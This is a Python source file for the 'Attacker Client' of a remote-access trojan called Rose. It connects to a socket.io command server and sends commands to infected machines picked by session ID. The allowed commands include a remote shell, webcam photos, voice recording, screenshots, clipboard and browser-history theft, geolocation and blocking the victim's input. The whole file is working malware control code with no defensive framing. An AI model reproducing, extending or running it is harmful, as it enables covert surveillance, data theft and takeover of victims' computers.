from pystyle import Colors, Colorate, Center, Box, Write

import os 
import ctypes
import time 

import socketio 
import webbrowser

import json

__version__ = "1.0"

with open("config.json", "r") as f:
    config = json.load(f)
    server_url = config["server_url"]

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("Rose Client | v" + __version__)
banner = """
OooOOo.
o     `o
O      O
o     .O
OOooOO'  .oOo. .oOo  .oOo.
o    o   O   o `Ooo. OooO'
O     O  o   O     O O
O      o `OoO' `OoO' `OoO'
"""
class Connected():
    def __init__(self):
        self.client_connected = 0
        
    def change(self, number):
        self.client_connected = number
        
    def get(self):
        return self.client_connected

class Serv():
    sio = socketio.Client()
    def __init__(self, url):
        self.v = __version__
        self._cmd = Command()
        self.url = url
        self._cmd = Command()
        self._connected = Connected()
        
    def _cls(self):
        os.system('cls')
            
    def home(self):
        self._cls()
        print(Colorate.Horizontal(Colors.red_to_white, Center.XCenter(banner)))
        print('\n')
        print(Colorate.Horizontal(Colors.red_to_white, Box.Lines(f'Attacker Client | v{__version__} | {self._connected.get()} Clients Connected')))
        print('\n')
        self.loop()
                
    def not_valid(self, cmd):
        print(Colorate.Horizontal(Colors.red_to_white, f"    .X {cmd} is not a valid command. Type 'help' for more info."))
        time.sleep(2)
        self.home()
    
    def setup(self):
        self.call_backs()
        self.sio.connect(self.url)
        self.sio.emit("number_connected")
        time.sleep(1) #Wait for the server to send the number of clients connected before loading the UI
        self.home()

    def loop(self): 
        while True:
            self.sio.emit("number_connected")
            cmd = Write.Input("\n    .$ ", Colors.red_to_white, interval=0.025)
            if cmd == "help":
                webbrowser.open("https://github.com/DamagingRose/Rose-Injector/tree/main/source/socketioserv")
                self.home(self._connected.get())
                
            elif cmd == "exit":
                exit()
            
            else:
                if not self._cmd.is_valid(cmd):
                    self.not_valid(cmd)
                sid = Write.Input("    .$ SID ? ", Colors.red_to_white, interval=0.025)
                try:
                    self.sio.emit(
                        'send_command',
                        {"data":
                            {"command": cmd,
                            "sid": sid
                            }
                        }
                    )
                    print(Colorate.Horizontal(Colors.green_to_white, f'    .$ Command Sent to {sid}'))
                except Exception as e: #Print command failed in red
                    print(Colorate.Horizontal(Colors.red_to_white, f'    .$ Command Failed to {sid}'))
                    print(Colorate.Horizontal(Colors.red_to_white, f'    .$ Advanced logs: {e}'))
                    time.sleep(2)
                    self.home(self._connected.get())
                    

    def call_backs(self):
        @self.sio.event
        def connect():
            self.sio.emit('client_connect', {"data": "Attacker Client Connected"})

        @self.sio.event
        def all_sessions(data):
            self._connected.change(data['data'])
            ctypes.windll.kernel32.SetConsoleTitleW(f"Rose Client | v{__version__} | {self._connected.get()} Clients Connected")
        
        @self.sio.event
        def auth(data):
            print(f"Data Received {data}")


        @self.sio.event
        def disconnect():
            print('disconnected from server')
            
    def run(self):
        self.setup()    

class Command(): 
    def __init__(self):
        self.valid = [
            'messagebox',
            'shell',
            'webcampic',
            'voice',
            'admincheck',
            'sysinfo',
            'history',
            'write',
            'wallpaper',
            'clipboard',
            'geolocate',
            'volumemax',
            'volumezero',
            'blockinput',
            'unblockinput',
            'screenshot',
            'kill'
        ]

    def is_valid(self, command):
        try:
            command = command.split(' ')[0]
        except Exception:
            pass
        for j in self.valid:
            if command == j:
                return True 
        return False
        
        
ss = Serv(server_url)
ss.run()